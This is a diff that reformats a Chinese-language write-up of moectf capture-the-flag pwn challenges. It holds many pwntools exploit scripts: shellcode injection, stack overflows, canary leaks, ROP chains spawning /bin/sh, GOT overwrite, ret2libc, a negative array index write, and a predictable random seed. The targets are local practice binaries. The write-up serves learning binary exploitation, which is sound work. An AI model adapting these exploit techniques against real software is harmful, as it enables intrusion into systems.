@@ -1,144 +1,20 @@
 # moectf ez\_shellcode
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-.
-terminal
-
-=
-
-[
-'wt.exe'
-,
-'wsl'
-]
-
-context
-.
-log_level
-
-=
-
-'debug'
-
-context
-.
-arch
-
-=
-
-'amd64'
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-p
-.
-recvuntil
-(
-"age"
-)
-
-p
-.
-sendline
-(
-'130'
-)
-
-p
-.
-recvuntil
-(
-"you :
-\n
-"
-)
-
-buf_addr
-
-=
-
-int
-(
-p
-.
-recvuntil
-(
-'
-\n
-'
-)
-.
-decode
-(),
-
-16
-)
-
-payload
-
-=
-
-asm
-(
-shellcraft
-.
-sh
-())
-.
-ljust
-(
-0x60
-+
-0x8
-,
-b
-'a'
-)
-
-+
-
-p64
-(
-buf_addr
-)
-
-p
-.
-recvuntil
-(
-"say"
-)
-
-p
-.
-send
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+```python
+from pwn import *
+context.terminal = ['wt.exe','wsl']
+context.log_level = 'debug'
+context.arch = 'amd64'
+p = process('./pwn')
+p.recvuntil("age")
+p.sendline('130')
+p.recvuntil("you :\n")
+buf_addr = int(p.recvuntil('\n').decode(), 16)
+payload = asm(shellcraft.sh()).ljust(0x60+0x8,b'a') + p64(buf_addr)
+p.recvuntil("say")
+p.send(payload)
+p.interactive()
 ```
 
 
@@ -146,89 +22,18 @@ interactive
 
 
 ```
-
-❯
-
-checksec
-
-pwn
-
-[
-*
-]
-
-'/home/pwn/pwn/moectf/ez_shellcode/pwn'
-
-
-Arch:
-
-amd64-64-little
-
-
-RELRO:
-
-No
-
-RELRO
-
-
-Stack:
-
-No
-
-canary
-
-found
-
-
-NX:
-
-NX
-
-unknown
-
--
-
-GNU_STACK
-
-missing
-
-
-PIE:
-
-PIE
-
-enabled
-
-
-Stack:
-
-Executable
-
-
-RWX:
-
-Has
-
-RWX
-
-segments
-
-
-SHSTK:
-
-Enabled
-
-
-IBT:
-
-Enabled
-
-
-Stripped:
-
-No
-
+❯ checksec pwn
+[*] '/home/pwn/pwn/moectf/ez_shellcode/pwn'
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
 ```
 
 ![image-20250216172734148](../../images/image-20250216172734148.png)
@@ -241,72 +46,15 @@ No
 格式化字符串漏洞读指定位置数据
 
 
-```
+```python
+from pwn import *
+p = process('./pwn')
+p.send(b'%7$ld')
+p.recvuntil('name:\n')
+num = int(p.recvuntil('G')[:-1])
 
-from
-
-pwn
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-p
-.
-send
-(
-b
-'%7$ld'
-)
-
-p
-.
-recvuntil
-(
-'name:
-\n
-'
-)
-
-num
-
-=
-
-int
-(
-p
-.
-recvuntil
-(
-'G'
-)[:
--
-1
-])
-
-p
-.
-send
-(
-str
-(
-num
-))
-
-p
-.
-interactive
-()
-
+p.send(str(num))
+p.interactive()
 ```
 
 ![image-20250217105225238](../../images/image-20250217105225238.png)
@@ -317,55 +65,11 @@ interactive
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-payload
-
-=
-
-b
-'b'
-*
-0x50
-+
-b
-'b'
-*
-0x8
-+
-p64
-(
-0x401193
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+from pwn import *
+p = process('./pwn')
+payload = b'b'*0x50+b'b'*0x8+p64(0x401193)
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -378,135 +82,19 @@ interactive
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+p = process('./pwn')
 #gdb.attach(p)
-
-sys
-
-=
-
-0x0000000000404050
-
-payload
-
-=
-
-b
-'%9$ln'
-.
-ljust
-(
-8
-,
-b
-'
-\x00
-'
-)
-+
-p64
-(
-sys
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-sendafter
-(
-b
-'password'
-,
-b
-'
-\x00
-'
-*
-0x8
-)
-
-p
-.
-interactive
-()
-
+sys = 0x0000000000404050
+payload = b'%9$ln'.ljust(8,b'\x00')+p64(sys)
+p.sendline(payload)
+p.sendafter(b'password',b'\x00'*0x8)
+p.interactive()
 ```
 
 
@@ -519,192 +107,36 @@ interactive
 
 
 ```
-
-The
-
-plane
-
-is
-
-about
-
-to
-
-crash.
-
-Do
-
-something!
-
-[
-CTR
-]
-
-Fly
-
-to
-
-airport
-
-at
-
-69259509840
-.
-
-[
-Meters
-]
-
-
-Altitude:
-
-10000
-
-
-Velocity:
-
-300
-
-
-Bank
-
-angle:
-
-0
-
-
-Thrust:
-
-engine#1:
-
-20
-;
-
-engine#2:
-
-20
-;
-
-engine#3:
-
-20
-;
-
-engine#4:
-
-20
-;
-
-[
-Navigator
-]
-
-
-Flight:
-
-0
-
-
-Target:
-
-69259509840
-
-[
-MoePlane
-
-Console
-]
-
-
-0
-.
-
-Check
-
-the
-
-meters.
-
-
-1
-.
-
-Adjust
-
-engine
-
-thrust.
-
-
-2
-.
-
-Adjust
-
-trim.
-
-
-3
-.
-
-Win
-
-the
-
-game!
-Make
-
-your
-
-choice:
+The plane is about to crash. Do something!
+[CTR] Fly to airport at 69259509840.
+[Meters]
+  Altitude: 10000
+  Velocity: 300
+  Bank angle: 0
+  Thrust: engine#1: 20; engine#2: 20; engine#3: 20; engine#4: 20;
+[Navigator]
+  Flight: 0
+  Target: 69259509840
+[MoePlane Console]
+  0. Check the meters.
+  1. Adjust engine thrust.
+  2. Adjust trim.
+  3. Win the game!
+Make your choice:
 >
-
 ```
 
 连接之后会有这些显示，进行一番尝试之后只发现`1. Adjust engine thrust`有点可疑，因为似乎有修改数据的权限
 
 
 ```
-
-Make
-
-your
-
-choice:
->
-
-1
-
-Which
-
-engine?
->
-
--1
-Thrust
-
-in
-
-percentage
-
-(
-0
-
-~
-
-100
-)
-.
->
-
-1
-
-Adjusting
-
-engine
-
-#-1's thrust to 1[INFO] Done.
-
+Make your choice:
+> 1
+Which engine?
+> -1
+Thrust in percentage (0 ~ 100).
+> 1
+Adjusting engine #-1's thrust to 1[INFO] Done.
 ```
 
 直接盲猜有负数的非预期输入，结果还真是，那接下来就很好解决了
@@ -712,61 +144,14 @@ engine
 看下题目给我们的提示：
 
 
-```
-
-struct
-
-airplane
-
-{
-
-
-long
-
-flight
-;
-
-
-int
-
-altitude
-;
-
-// 4 字节
-
-
-int
-
-velocity
-;
-
-// 4 字节
-
-
-int
-
-angle
-;
-
-// 4 字节
-
-
-unsigned
-
-char
-
-engine_thrust
-[
-ENGINES
-];
-
-// 距离 `flight` 12 字节
-
-}
-
-moeplane
-;
-
+```asm
+struct airplane {
+    long flight;
+    int altitude; // 4 字节
+    int velocity; // 4 字节
+    int angle;    // 4 字节
+    unsigned char engine_thrust[ENGINES]; // 距离 `flight` 12 字节
+} moeplane;
 ```
 
 我们输入的地方是`engine_thrust[ENGINES]`是一个数组元素，根据数组寻址的特性（基址+偏移），我们可以通过输入负数往上方数据写，把flight给覆盖掉，成为目标距离`69259509840`(等效十六进制0x1020304050)
@@ -785,207 +170,25 @@ exp：
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-(
-arch
-=
-'amd64'
-,
-log_level
-=
-'debug'
-)
-
-p
-
-=
-
-remote
-(
-'127.0.0.1'
-,
-64479
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'1'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'-15'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'16'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'1'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'-16'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'32'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'1'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'-17'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'48'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'1'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'-18'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'64'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'1'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'-19'
-)
-
-p
-.
-sendlineafter
-(
-b
-'>'
-,
-b
-'80'
-)
-
-p
-.
-interactive
-()
-
+from pwn import *
+context(arch='amd64',log_level='debug')
+p = remote('127.0.0.1',64479)
+p.sendlineafter(b'>',b'1')
+p.sendlineafter(b'>',b'-15')
+p.sendlineafter(b'>',b'16')
+p.sendlineafter(b'>',b'1')
+p.sendlineafter(b'>',b'-16')
+p.sendlineafter(b'>',b'32')
+p.sendlineafter(b'>',b'1')
+p.sendlineafter(b'>',b'-17')
+p.sendlineafter(b'>',b'48')
+p.sendlineafter(b'>',b'1')
+p.sendlineafter(b'>',b'-18')
+p.sendlineafter(b'>',b'64')
+p.sendlineafter(b'>',b'1')
+p.sendlineafter(b'>',b'-19')
+p.sendlineafter(b'>',b'80')
+p.interactive()
 ```
 
 （手动输入应该也行，似乎有些拼手速）
@@ -1010,80 +213,13 @@ interactive
 大道至简，一个个试
 
 
-```
-
-p
-.
-sendline
-(
-str
-(
-0xabcd00
-)
-.
-encode
-())
-
-for
-
-i
-
-in
-
-range
-(
-0x00ffdcba
-,
-0x01000000
-):
-
-
-p
-.
-sendlineafter
-(
-b
-'n.
-\n
-'
-,
-str
-(
-i
-)
-.
-encode
-())
-
-
-rec
-
-=
-
-p
-.
-recvuntil
-(
-b
-']'
-)
-
-
-if
-
-b
-'Error'
-
-not
-
-in
-
-rec
-:
-
-
-break
-
+```python
+p.sendline(str(0xabcd00).encode())
+for i in range(0x00ffdcba,0x01000000):
+    p.sendlineafter(b'n.\n',str(i).encode())
+    rec = p.recvuntil(b']')
+    if b'Error' not in rec:
+        break
 ```
 
 
@@ -1104,40 +240,9 @@ break
 
 
 ```
-
-p
-.
-sendlineafter
-(
-b
-'t.
-\n
-'
-,
-b
-'+'
-)
-
-p
-.
-sendline
-(
-b
-'1'
-)
-
-p
-.
-sendline
-(
-str
-(
-0xbacd003
-)
-.
-encode
-())
-
+p.sendlineafter(b't.\n',b'+')
+p.sendline(b'1')
+p.sendline(str(0xbacd003).encode())
 ```
 
 
@@ -1149,286 +254,44 @@ encode
 
 
 ```
-
-p
-.
-send
-(
-b
-'b'
-*
-25
-)
-
-p
-.
-recvuntil
-(
-b
-'b'
-*
-25
-)
-
-canary
-
-=
-
-b
-'
-\x00
-'
-+
-p
-.
-recv
-(
-7
-)
-
-print
-(
-canary
-)
-
+p.send(b'b'*25)
+p.recvuntil(b'b'*25)
+canary = b'\x00'+p.recv(7)
+print(canary)
 ```
 
 
 ## 最终实现
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
+```python
+from pwn import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+p = process('./pwn')
 
 #------------1--------------
-
-p
-.
-sendline
-(
-str
-(
-0xabcd00
-)
-.
-encode
-())
-
-for
-
-i
-
-in
-
-range
-(
-0x00ffdcba
-,
-0x01000000
-):
-
-
-p
-.
-sendlineafter
-(
-b
-'n.
-\n
-'
-,
-str
-(
-i
-)
-.
-encode
-())
-
-
-rec
-
-=
-
-p
-.
-recvuntil
-(
-b
-']'
-)
-
-
-if
-
-b
-'Error'
-
-not
-
-in
-
-rec
-:
-
-
-break
+p.sendline(str(0xabcd00).encode())
+for i in range(0x00ffdcba,0x01000000):
+    p.sendlineafter(b'n.\n',str(i).encode())
+    rec = p.recvuntil(b']')
+    if b'Error' not in rec:
+        break
 
 #-----------2-------------
-
-p
-.
-sendlineafter
-(
-b
-'t.
-\n
-'
-,
-b
-'+'
-)
-
-p
-.
-sendline
-(
-b
-'1'
-)
-
-p
-.
-sendline
-(
-str
-(
-0xbacd003
-)
-.
-encode
-())
+p.sendlineafter(b't.\n',b'+')
+p.sendline(b'1')
+p.sendline(str(0xbacd003).encode())
 
 #----------3------------
+backdoor = 0x4012AD
+p.send(b'b'*25)
+p.recvuntil(b'b'*25)
+canary = b'\x00'+p.recv(7)
+print(canary)
+p.send(b'b'*24+canary+b'b'*0x8+p64(backdoor))
 
-backdoor
-
-=
-
-0x4012AD
-
-p
-.
-send
-(
-b
-'b'
-*
-25
-)
-
-p
-.
-recvuntil
-(
-b
-'b'
-*
-25
-)
-
-canary
-
-=
-
-b
-'
-\x00
-'
-+
-p
-.
-recv
-(
-7
-)
-
-print
-(
-canary
-)
-
-p
-.
-send
-(
-b
-'b'
-*
-24
-+
-canary
-+
-b
-'b'
-*
-0x8
-+
-p64
-(
-backdoor
-))
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
 
@@ -1441,70 +304,12 @@ interactive
 
 
 ```
-
-payload
-
-=
-
-b
-'a'
-*
-0x18
-+
-b
-'b'
-
-p
-.
-recvuntil
-(
-b
-'id?'
-)
-
-p
-.
-send
-(
-payload
-)
-
-p
-.
-recvuntil
-(
-payload
-)
-
-canary
-
-=
-
-u64
-(
-b
-'
-\x00
-'
-+
-p
-.
-recv
-(
-7
-))
-
-log
-.
-info
-(
-"canary"
-+
-hex
-(
-canary
-))
-
+payload = b'a'*0x18+b'b'
+p.recvuntil(b'id?')
+p.send(payload)
+p.recvuntil(payload)
+canary = u64(b'\x00'+p.recv(7))
+log.info("canary"+hex(canary))
 ```
 
 接着是输入`buf2`，这里构造ROP链（我相信你已经可以看懂ROP链了，如果看不懂，再去写写其它题再来吧），稍后执行这里就行
@@ -1515,257 +320,35 @@ canary
 
 
 ```
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+p = process('./pwn')
+pop_rax = 0x00000000004508b7
+pop_rdi = 0x000000000040239f
+pop_rsi = 0x000000000040a40e
+pop_rdx_rbx = 0x000000000049d12b
+syscall = 0x402154
+binsh = 0x00000000004e3950
 
-from
+payload = b'a'*0x18+b'b'
+p.recvuntil(b'id?')
+p.send(payload)
+p.recvuntil(payload)
+canary = u64(b'\x00'+p.recv(7))
+log.info("canary"+hex(canary))
 
-pwn
+payload2 = b'B'*0x18+p64(canary)+b'c'*0x8
+payload2+=p64(pop_rax)+p64(59)
+payload2+=p64(pop_rdi)+p64(binsh)
+payload2+=p64(pop_rsi)+p64(0)
+payload2+=p64(pop_rdx_rbx)+p64(0)+p64(0)
+payload2+=p64(syscall)
 
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-arch
-=
-'amd64'
-,
-log_level
-=
-'debug'
-)
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-pop_rax
-
-=
-
-0x00000000004508b7
-
-pop_rdi
-
-=
-
-0x000000000040239f
-
-pop_rsi
-
-=
-
-0x000000000040a40e
-
-pop_rdx_rbx
-
-=
-
-0x000000000049d12b
-
-syscall
-
-=
-
-0x402154
-
-binsh
-
-=
-
-0x00000000004e3950
-
-payload
-
-=
-
-b
-'a'
-*
-0x18
-+
-b
-'b'
-
-p
-.
-recvuntil
-(
-b
-'id?'
-)
-
-p
-.
-send
-(
-payload
-)
-
-p
-.
-recvuntil
-(
-payload
-)
-
-canary
-
-=
-
-u64
-(
-b
-'
-\x00
-'
-+
-p
-.
-recv
-(
-7
-))
-
-log
-.
-info
-(
-"canary"
-+
-hex
-(
-canary
-))
-
-payload2
-
-=
-
-b
-'B'
-*
-0x18
-+
-p64
-(
-canary
-)
-+
-b
-'c'
-*
-0x8
-
-payload2
-+=
-p64
-(
-pop_rax
-)
-+
-p64
-(
-59
-)
-
-payload2
-+=
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh
-)
-
-payload2
-+=
-p64
-(
-pop_rsi
-)
-+
-p64
-(
-0
-)
-
-payload2
-+=
-p64
-(
-pop_rdx_rbx
-)
-+
-p64
-(
-0
-)
-+
-p64
-(
-0
-)
-
-payload2
-+=
-p64
-(
-syscall
-)
-
-p
-.
-recvuntil
-(
-b
-'name?
-\n
-'
-)
-
-p
-.
-sendline
-(
-payload2
-)
-
-p
-.
-recvuntil
-(
-b
-'quit
-\n
-'
-)
-
-p
-.
-sendline
-(
-b
-'-111'
-)
-
-p
-.
-interactive
-()
-
+p.recvuntil(b'name?\n')
+p.sendline(payload2)
+p.recvuntil(b'quit\n')
+p.sendline(b'-111')
+p.interactive()
 ```
 
 
@@ -1775,87 +358,23 @@ interactive
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
+from pwn import *
 #p = process('./pwn')
+p = remote('127.0.0.1',56063)
+sys = 0x401056
+un = 0x401196
 
-p
+payload = p64(0)*2+p64(sys)+p64(0)*4+p64(un)
+p.send(payload)
 
-=
-
-remote
-(
-'127.0.0.1'
-,
-56063
-)
-
-sys
-
-=
-
-0x401056
-
-un
-
-=
-
-0x401196
-
-payload
-
-=
-
-p64
-(
-0
-)
-*
-2
-+
-p64
-(
-sys
-)
-+
-p64
-(
-0
-)
-*
-4
-+
-p64
-(
-un
-)
-
-p
-.
-send
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
-| image-20250217130722401 |
+| ![](../../images/image-20250217130722401.png) |
 | --- |
 | ida中可以查到`system`函数的plt表地址，.GOT初始值 |
 
-| image-20250217131303322 |
+| ![](../../images/image-20250217131303322.png) |
 | --- |
 | 除了system，其它都分别覆盖掉，不需要的直接用0盖掉，exit用后门函数覆盖 |
 
@@ -1869,231 +388,40 @@ interactive
 
 
 ```
-
-❯
-
-checksec
-
-pwn
-
-[
-*
-]
-
-'/home/pwn/pwn/moectf/prelibc/pwn'
-
-
-Arch:
-
-amd64-64-little
-
-
-RELRO:
-
-Partial
-
-RELRO
-
-
-Stack:
-
-No
-
-canary
-
-found
-
-
-NX:
-
-NX
-
-enabled
-
-
-PIE:
-
-PIE
-
-enabled
-
-
-Stripped:
-
-No
-
+❯ checksec pwn
+[*] '/home/pwn/pwn/moectf/prelibc/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
 ```
 
 开启了NX和PIE，确实libc好做
 
 
 ```
+from pwn import *
 
-from
-
-pwn
-
-import
-
-*
-
-context
-(
-os
-=
-"linux"
-,
-
-arch
-=
-"amd64"
-)
+context(os="linux", arch="amd64")
 
 #io = process('./pwn')
+io = remote('127.0.0.1',58265)
+libc = ELF("./libc.so.6")
 
-io
+io.recvuntil(b"0x")
+libc.address = int(io.recv(12), 16) - libc.sym["puts"]
 
-=
-
-remote
-(
-'127.0.0.1'
-,
-58265
-)
-
-libc
-
-=
-
-ELF
-(
-"./libc.so.6"
-)
-
-io
-.
-recvuntil
-(
-b
-"0x"
-)
-
-libc
-.
-address
-
-=
-
-int
-(
-io
-.
-recv
-(
-12
-),
-
-16
-)
-
--
-
-libc
-.
-sym
-[
-"puts"
-]
-
-payload
-
-=
-
-cyclic
-(
-9
-)
-
-+
-
-flat
-([
-
-
-libc
-.
-search
-(
-asm
-(
-"pop rdi; ret;"
-))
-.
-__next__
-()
-
-+
-
-1
-,
-
-
-# 即 `ret`，用于栈指针对齐
-
-
-libc
-.
-search
-(
-asm
-(
-"pop rdi; ret;"
-))
-.
-__next__
-(),
-
-
-libc
-.
-search
-(
-b
-"/bin/sh
-\x00
-"
-)
-.
-__next__
-(),
-
-
-libc
-.
-sym
-[
-"system"
-],
-
+payload = cyclic(9) + flat([
+        libc.search(asm("pop rdi; ret;")).__next__() + 1, # 即 `ret`，用于栈指针对齐
+        libc.search(asm("pop rdi; ret;")).__next__(),
+        libc.search(b"/bin/sh\x00").__next__(),
+        libc.sym["system"],
 ])
+io.sendafter(b">", payload)
 
-io
-.
-sendafter
-(
-b
-">"
-,
-
-payload
-)
-
-io
-.
-interactive
-()
-
+io.interactive()
 ```
 
 *直接用的官方wp*
@@ -2106,140 +434,22 @@ interactive
 生成随机数的种子为一年中当前天数-1.所以直接照抄源码里生成随机数的逻辑
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-ctypes
-
-import
-
-*
-
-from
-
-time
-
-import
-
-localtime
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
+```python
+from pwn import *
+from ctypes import *
+from time import localtime
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
 #p = process('./pwn')
+p = remote('127.0.0.1',50656)
 
-p
+libc = cdll.LoadLibrary("libc.so.6")
+libc.srandom(localtime().tm_yday - 1)
 
-=
+for _ in range(12):
+    p.sendlineafter(b'\n',str(libc.random()%90000+10000).encode())
 
-remote
-(
-'127.0.0.1'
-,
-50656
-)
-
-libc
-
-=
-
-cdll
-.
-LoadLibrary
-(
-"libc.so.6"
-)
-
-libc
-.
-srandom
-(
-localtime
-()
-.
-tm_yday
-
--
-
-1
-)
-
-for
-
-_
-
-in
-
-range
-(
-12
-):
-
-
-p
-.
-sendlineafter
-(
-b
-'
-\n
-'
-,
-str
-(
-libc
-.
-random
-()
-%
-90000
-+
-10000
-)
-.
-encode
-())
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
 
@@ -2266,134 +476,19 @@ ida里查看各个函数，可以发现在`down`函数的功能是输出`flag`�
 exp:
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
+```python
+from pwn import *
 #p = process('./pwn')
+p = remote('127.0.0.1',64393)
+last_line = bytes()
+while 1:
+    line = p.recv() # 持续接受数据
+    if b'[Error]' in line:  # 遇到[Error]时停止接受
+        break
+    last_line = line    # 记录最后一行的数据
 
-p
-
-=
-
-remote
-(
-'127.0.0.1'
-,
-64393
-)
-
-last_line
-
-=
-
-bytes
-()
-
-while
-
-1
-:
-
-
-line
-
-=
-
-p
-.
-recv
-()
-
-
-# 持续接受数据
-
-
-if
-
-b
-'[Error]'
-
-in
-
-line
-:
-
-
-# 遇到[Error]时停止接受
-
-
-break
-
-
-last_line
-
-=
-
-line
-
-
-# 记录最后一行的数据
-
-password
-
-=
-
-last_line
-[
-28
-:
-28
-+
-15
-]
-
-
-# 字节序列的28开始往后顺15个截留下来
-
-p
-.
-send
-(
-password
-+
-b
-'
-\x00
-'
-+
-p64
-(
-12345
-)[
-0
-:
-7
-])
-
-
-# 在第16位截断，后面不比较了就，接着塞进去一个5位数切成7字节，留给v1[1]
-
-p
-.
-sendline
-(
-b
-'12345'
-)
-
-
-# 输入v1[0]就好
-
-p
-.
-interactive
-()
-
+password = last_line[28:28+15]  # 字节序列的28开始往后顺15个截留下来
+p.send(password+b'\x00'+p64(12345)[0:7])    # 在第16位截断，后面不比较了就，接着塞进去一个5位数切成7字节，留给v1[1]
+p.sendline(b'12345')    # 输入v1[0]就好
+p.interactive()
 ```
